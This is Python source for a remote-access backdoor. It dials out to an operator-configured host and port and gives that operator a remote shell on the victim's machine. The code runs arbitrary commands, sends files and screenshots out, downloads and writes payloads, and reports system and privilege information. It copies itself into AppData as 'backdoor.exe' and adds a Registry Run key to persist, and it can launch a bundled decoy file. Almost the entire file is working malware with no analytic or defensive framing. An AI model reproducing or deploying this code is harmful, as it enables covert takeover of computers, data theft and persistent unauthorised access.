#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import platform
import getpass
from mss import mss
import delc

global ipnoc , ponoc , p
ipnoc = " jsa"
ponoc = 1
p = 'n'
def rel_send(data):
	json_data = (json.dumps(data)).encode('UTF-8')
	sock.send(json_data)

def rel_recv() :
	json_data = ""
	while True :
		try :
			json_data = json_data + str((sock.recv(1024)).decode('UTF-8'))
			return json.loads(json_data)
		except ValueError:
			continue

def conne():
	while True :
		time.sleep(10)
		ipnoc = delc.ipnod
		ponoc = delc.ponod
		try :
			global sock
			sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
			sock.connect((str(ipnoc),int(ponoc)))
			print("Connection done")
			shell()
		except :
			print("trying")

def shell():
	while True:
		comm = rel_recv()
		if comm == "Exit" :
			break
		elif comm[:3] == "cd " and len(comm) > 2:
			try :
				os.chdir(comm[3:])
				rel_send("Changed")
			except :
				rel_send("[!!] Unable to change")
		elif comm[:9] == "download ":
			if not os.path.exists(comm.split(" ")[1]):
				sock.send(b"[!!] No File Found")
			elif (os.path.isdir(comm.split(" ")[1])) :
				sock.send(b"[!!] Can't download folder")
			else :
				try :
					with open(comm.split(" ")[1], "rb") as f:
						file_data = f.read(1024)
						while file_data:
							sock.send(file_data)
							file_data = f.read(1024)
						time.sleep(1)
						sock.send(b"DONE")
				except :
					sock.send(b"Error Occurred")
		elif comm[:7] == "upload " :
			try :
				file_name = (comm.split(" ")[1]).split("/")[-1]
				read_data = sock.recv(1024)
				if read_data == b"[!!!]":
					continue
				else :
					with open(file_name, "wb") as f:
						while read_data:
							f.write(read_data)
							read_data = sock.recv(1024)
							if read_data == b"DONE":
								break
			except :
				continue
		elif comm[:4] == "get " :
			try :
				get_resp = requests.get(comm[4:])
				file_name = str((comm.split(" ")[1]).split("/")[-1])
				if (file_name.find('*') != -1 or file_name.find('/') != -1 or file_name.find('\\') != -1 or file_name.find(':') != -1 or file_name.find('?') != -1 or file_name.find('"') != -1 or file_name.find('<') != -1 or file_name.find('>') != -1 or file_name.find('|') != -1):
					rel_send(" [!!] Name Not Accepted")
				else :
					with open(file_name , "wb") as out_file :
							out_file.write(get_resp.content)
					rel_send(" [+] Downloaded Successfully")
			except :
				rel_send(" [!!] Unable to Download")
		elif comm[:6] == "start ":
			try :
				subprocess.Popen(comm , shell = True)
				rel_send(" [+] Started ")
			except :
				rel_send(" [!!] Failed to start")
		elif comm == "sysinfo":
			sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
			rel_send(str(sysinfo))
		elif comm == "screenshot" :
			try :
				with mss() as screenshot :
					screenshot.shot()
				if not os.path.exists("monitor-1.png"):
					sock.send(b"[!!] No File Found")
				else :
					with open("monitor-1.png", "rb") as f :
						file_data = f.read(1024)
						while file_data:
							sock.send(file_data)
							file_data = f.read(1024)
						time.sleep(1)
						sock.send(b"DONE")
					os.remove("monitor-1.png")
			except :
				sock.send(b"Error Occurred")
		elif comm == "check priviliges":
			try :
				try :
					temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\Windows' ), 'temp']))
					rel_send(" Admin Privileges")
				except :
					rel_send(" User Privileges")
			except :
				rel_send("[!!] Unable to Check")
		else:
			try:
				proc = subprocess.Popen(comm , shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
				re = proc.stdout.read() + proc.stderr.read()
				rel_send(re.decode('UTF-8'))
			except:
				rel_send("[!!] Can't Execte That Command")
p = delc.presd
if (p == 'Y' or p == 'y'):
	location = os.environ["appdata"] + "\\backdoor.exe"
	if not os.path.exists(location):
		shutil.copyfile(sys.executable, location)
		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"',shell = True)

im = delc.imopd
if (im == 'Y' or im == 'y') :
	imnac = "\\" + delc.imnad.split('\\')[-1]
	name = sys._MEIPASS + str(imnac)
	try :
		subprocess.Popen(name , shell = True)
	except :	
		a = 12

conne()
sock.close()
